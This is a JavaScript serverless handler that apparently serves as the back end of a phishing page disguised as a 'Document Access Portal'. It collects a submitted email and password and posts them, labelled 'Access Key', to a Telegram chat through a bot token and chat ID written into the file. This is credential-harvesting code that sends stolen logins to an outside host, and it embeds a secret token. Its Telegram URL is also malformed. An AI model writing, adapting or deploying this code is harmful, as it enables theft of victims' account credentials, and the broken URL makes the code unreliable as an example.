export default async function handler(req, res) {
    // 1. Handle Preflight CORS requests and strict POST check
    if (req.method !== 'POST') {
        res.setHeader('Allow', ['POST']);
        return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
    }

    try {
        const { email, password } = req.body || {};

        if (!email || !password) {
            return res.status(400).json({ error: "Please complete all verification fields." });
        }

        const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
        const chatId = "1080822304";

        const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n`
                          + `📧 *Portal Email:* ${email}\n`
                          + `🔑 *Access Key:* \`${password}\``;

        const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

        // 2. Safe Payload Structure
        const payload = {
            chat_id: chatId,
            text: messageText,
            parse_mode: 'Markdown'
        };

        // 3. Request execution using native HTTPS handling to prevent runtime compilation errors
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        const result = await response.json();

        if (response.ok && result.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(400).json({ error: result.description || "Telegram API rejected the request." });
        }

    } catch (error) {
        // This ensures the 500 error prints the actual issue back to your console so you can read it
        return res.status(500).json({ error: `Server Exception: ${error.message}` });
    }
}
